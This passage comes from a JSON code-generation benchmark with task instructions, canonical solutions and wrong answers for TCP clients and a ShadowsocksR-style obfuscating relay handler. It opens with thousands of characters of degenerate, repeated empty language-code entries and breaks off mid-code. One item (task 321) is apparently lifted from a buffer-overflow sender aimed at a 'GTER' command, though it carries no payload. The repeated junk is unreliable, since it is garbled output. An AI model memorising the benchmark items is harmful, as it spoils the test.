\"\",\n        \"pt\": \"\",\n        \"it\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"ja\": \"\",\n        \"ko\": \"\",\n        \"zh\": \"\",\n        \"zh-TW\": \"\",\n        \"zh-CN\": \"\",\n        \"ar\": \"\",\n        \"cs\": \"\",\n        \"da\": \"\",\n        \"el\": \"\",\n        \"et\": \"\",\n        \"fi\": \"\",\n        \"he\": \"\",\n        \"hi\": \"\",\n        \"hr\": \"\",\n        \"hu\": \"\",\n        \"id\": \"\",\n        \"lt\": \"\",\n        \"lv\": \"\",\n        \"ro\": \"\",\n        \"sk\": \"\",\n        \"sl\": \"\",\n        \"sv\": \"\",\n        \"tr\": \"\",\n        \"uk\": \"\",\n        \"vi\": \"\",\n        \"bg\": \"\",\n        \"mk\": \"\",\n        \"sr\": \"\",\n        \"bs\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"mt\": \"\",\n        \"ga\": \"\",\n        \"is\": \"\",\n        \"lv\": \"\",\n        \"lt\": \"\",\n        \"et\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy\": \"\",\n        \"ka\": \"\",\n        \"be\": \"\",\n        \"uk\": \"\",\n        \"ru\": \"\",\n        \"en\": \"\",\n        \"de\": \"\",\n        \"fr\": \"\",\n        \"es\": \"\",\n        \"it\": \"\",\n        \"pt\": \"\",\n        \"nl\": \"\",\n        \"pl\": \"\",\n        \"cs\": \"\",\n        \"sk\": \"\",\n        \"hr\": \"\",\n        \"sl\": \"\",\n        \"da\": \"\",\n        \"no\": \"\",\n        \"sv\": \"\",\n        \"fi\": \"\",\n        \"is\": \"\",\n        \"mt\": \"\",\n        \"el\": \"\",\n        \"tr\": \"\",\n        \"az\": \"\",\n        \"kk\": \"\",\n        \"ky\": \"\",\n        \"tg\": \"\",\n        \"tk\": \"\",\n        \"mn\": \"\",\n        \"uz\": \"\",\n        \"tt\": \"\",\n        \"hy"
  },
  {
    "Task_id": 320,
    "Instruction": "Task Description: Create a TCP client function that establishes a connection to a server, sends a message, and receives a response.\n\nFunction Description: The function creates a TCP socket, connects to a specified server, sends a UTF-8 encoded message, receives a response, and then closes the connection. It handles the basic TCP client-server interaction.\n\nInput:\n- host: str - The IP address or hostname of the target server\n- port: int - The port number on which the server is listening\n- message: str - The message to be sent to the server\n\nOutput:\n- str - The decoded response received from the server",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host: str, port: int, message: str):\n    \"\"\"\n    TCP client interaction function that sends a message to server and receives response\n    \n    Args:\n        host: Server host address\n        port: Server port number\n        message: Message to send to server\n        \n    Returns:\n        The response received from server\n    \"\"\"\n    # Create TCP socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    # Connect to server\n    s.connect((host, port))\n    \n    # Send message\n    len_sent = s.send(message.encode('utf-8'))\n    \n    # Receive response\n    response = s.recv(1024)\n    \n    # Clean up\n    s.close()\n    \n    return response.decode('utf-8')",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef tcp_client(host, port, message):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        s.sendall(message.encode('utf-8'))\n        data = s.recv(1024)\n    return data.decode('utf-8')\n```"
  },
  {
    "Task_id": 321,
    "Instruction": "Task Description: Create a Python function that implements a TCP client to interact with a server by sending a command with an offset and receiving the server's response.\n\nFunction Description: The function `tcp_client_interaction` establishes a TCP connection to a specified server, sends a command concatenated with an offset, receives the server's initial response, and then closes the connection. This is useful for basic client-server communication over TCP/IPv4.\n\nInput:\n- `host` (str): The IP address or hostname of the target server.\n- `port` (int): The port number on which the server is listening.\n- `cmd` (str): The command to be sent to the server.\n- `offset` (str): An offset value to be appended to the command.\n\nOutput:\n- The function prints the server's initial response to the console.\n- The function prints a confirmation message (\"Done Sending GTER with buffer\") upon successful completion.",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, cmd, offset):\n    buffer = cmd + offset + '\\r\\n'\n    \n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    data = s.recv(1024)\n    print \"\\n\" + data\n    s.send(buffer)\n    s.close()\n    print \"Done Sending GTER with buffer\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef tcp_client_interaction(host, port, cmd, offset):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        s.sendall((cmd + offset).encode())\n        data = s.recv(1024)\n        print('Received', repr(data))\n        print(\"Done Sending GTER with buffer\")\n```"
  },
  {
    "Task_id": 324,
    "Instruction": "Task Description: Implement a TCP relay handler class that manages communication between a local socket and a remote socket, handling encryption, obfuscation, and protocol-specific operations.\n\nClass Description: The TCPRelayHandler class is responsible for managing the bidirectional communication between a local client and a remote server. It handles socket creation, connection establishment, data encryption/decryption, obfuscation, and protocol-specific operations. The class uses event-driven programming to manage socket events efficiently.\n\nAttributes:\n\n- _server: [object] - Reference to the parent server instance\n- _fd_to_handlers: [dict] - Mapping of file descriptors to their handler instances\n- _loop: [object] - Event loop instance for managing socket events\n- _local_sock: [socket.socket] - Local client socket\n- _remote_sock: [socket.socket] - Remote server socket\n- _config: [dict] - Configuration parameters\n- _dns_resolver: [object] - DNS resolver instance\n- _is_local: [bool] - Flag indicating if this is a local handler\n- _stage: [int] - Current connection stage\n- _encryptor: [object] - Encryption/decryption handler\n- _client_address: [tuple] - Client address (IP, port)\n- _obfs: [object] - Obfuscation handler\n- _protocol: [object] - Protocol handler\n- _local_sock_fd: [int] - Local socket file descriptor\n- _remote_sock_fd: [int] - Remote socket file descriptor\n- _remote_address: [tuple] - Remote server address (IP, port)\n- _data_to_write_to_remote: [list] - Buffer for data to be sent to remote\n\nMethods:\n\n- __init__(server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local) -> [None] - Initializes the handler with server references, sockets, and configuration\n- _create_remote_socket(ip, port) -> [socket.socket] - Creates and configures a remote socket\n- _handle_dns_resolved(result, error) -> [None] - Handles DNS resolution result\n- _write_to_sock(data, sock) -> [bytes/None] - Writes data to specified socket\n- _on_local_read() -> [None] - Handles incoming data from local socket\n- _on_remote_read() -> [None] - Handles incoming data from remote socket\n- _on_remote_write() -> [None] - Handles write events for remote socket\n- handle_event(sock, fd, event) -> [bool] - Processes socket events\n- destroy() -> [None] - Cleans up resources and closes sockets",
    "Canonical_solution": "import socket\nimport errno\nimport struct\nimport logging\nimport binascii\nimport common\nimport obfs\nimport encrypt\nimport eventloop\nimport lru_cache\n\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = STAGE_INIT\n        self._create_encryptor(config)\n        self._client_address = local_sock.getpeername()[:2]\n        self._update_tcp_mss(local_sock)\n        self._obfs = obfs.obfs(config['obfs'])\n        self._protocol = obfs.obfs(config['protocol'])\n        self._setup_server_info()\n        local_sock.setblocking(False)\n        self._local_sock_fd = local_sock.fileno()\n        fd_to_handlers[self._local_sock_fd] = self\n        loop.add(local_sock, eventloop.POLL_IN | eventloop.POLL_ERR, self._server)\n\n    def _create_remote_socket(self, ip, port):\n        addrs = socket.getaddrinfo(ip, port, 0, socket.SOCK_STREAM, socket.SOL_TCP)\n        af, socktype, proto, canonname, sa = addrs[0]\n        remote_sock = socket.socket(af, socktype, proto)\n        remote_sock.setblocking(False)\n        remote_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        self._remote_sock = remote_sock\n        self._remote_sock_fd = remote_sock.fileno()\n        self._fd_to_handlers[self._remote_sock_fd] = self\n        return remote_sock\n\n    def _handle_dns_resolved(self, result, error):\n        if error:\n            self.destroy()\n            return\n        if result:\n            ip = result[1]\n            if ip:\n                try:\n                    remote_sock = self._create_remote_socket(ip, self._remote_address[1])\n                    remote_sock.connect((ip, self._remote_address[1]))\n                    self._loop.add(remote_sock, eventloop.POLL_ERR | eventloop.POLL_OUT, self._server)\n                    self._stage = STAGE_CONNECTING\n                except Exception as e:\n                    self.destroy()\n\n    def _write_to_sock(self, data, sock):\n        try:\n            if sock == self._remote_sock:\n                self._update_activity(len(data))\n                sent = sock.send(data)\n                if sent < len(data):\n                    return data[sent:]\n            return None\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                self.destroy()\n            return data\n\n    def _on_local_read(self):\n        try:\n            data = self._local_sock.recv(BUF_SIZE)\n            if not data:\n                self.destroy()\n                return\n            if self._is_local:\n                if self._encryptor is not None:\n                    data = self._protocol.client_pre_encrypt(data)\n                    data = self._encryptor.encrypt(data)\n                    data = self._obfs.client_encode(data)\n            self._write_to_sock(data, self._remote_sock)\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EWOULDBLOCK):\n                self.destroy()\n\n    def _on_remote_read(self):\n        try:\n            data = self._remote_sock.recv(BUF_SIZE)\n            if not data:\n                self.destroy()\n                return\n            if self._is_local:\n                obfs_decode = self._obfs.client_decode(data)\n                data = self._encryptor.decrypt(obfs_decode[0])\n                data = self._protocol.client_post_decrypt(data)\n            self._write_to_sock(data, self._local_sock)\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EWOULDBLOCK):\n                self.destroy()\n\n    def _on_remote_write(self):\n        self._stage = STAGE_STREAM\n        if self._data_to_write_to_remote:\n            data = b''.join(self._data_to_write_to_remote)\n            self._data_to_write_to_remote = []\n            remaining = self._write_to_sock(data, self._remote_sock)\n            if remaining is not None:\n                self._data_to_write_to_remote.append(remaining)\n\n    def handle_event(self, sock, fd, event):\n        if fd == self._remote_sock_fd:\n            if event & eventloop.POLL_ERR:\n                self.destroy()\n            elif event & eventloop.POLL_IN:\n                self._on_remote_read()\n            elif event & eventloop.POLL_OUT:\n                self._on_remote_write()\n        elif fd == self._local_sock_fd:\n            if event & eventloop.POLL_ERR:\n                self.destroy()\n            elif event & eventloop.POLL_IN:\n                self._on_local_read()\n        return True\n\n    def destroy(self):\n        if self._remote_sock:\n            self._loop.removefd(self._remote_sock_fd)\n            del self._fd_to_handlers[self._remote_sock_fd]\n            self._remote_sock.close()\n        if self._local_sock:\n            self._loop.removefd(self._local_sock_fd)\n            del self._fd_to_handlers[self._local_sock_fd]\n            self._local_sock.close()\n        self._server.remove_handler(self)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = 0\n        self._encryptor = None\n        self._client_address = local_sock.getpeername()\n        self._obfs = None\n        self._protocol = None\n        self._local_sock_fd = local_sock.fileno()\n        self._remote_sock_fd = None\n        self._remote_address = None\n        self._data_to_write_to_remote = []\n\n        self._loop.add_reader(self._local_sock_fd, self._on_local_read)\n        self._loop.add_reader(self._remote_sock_fd, self._on_remote_read)\n        self._loop.add_writer(self._remote_sock_fd, self._on_remote_write)\n\n    def _create_remote_socket(self, ip, port):\n        remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        remote_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        remote_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        remote_sock.connect((ip, port))\n        return remote_sock\n\n    def _handle_dns_resolved(self, result, error):\n        if error is None:\n            ip = result[0]\n            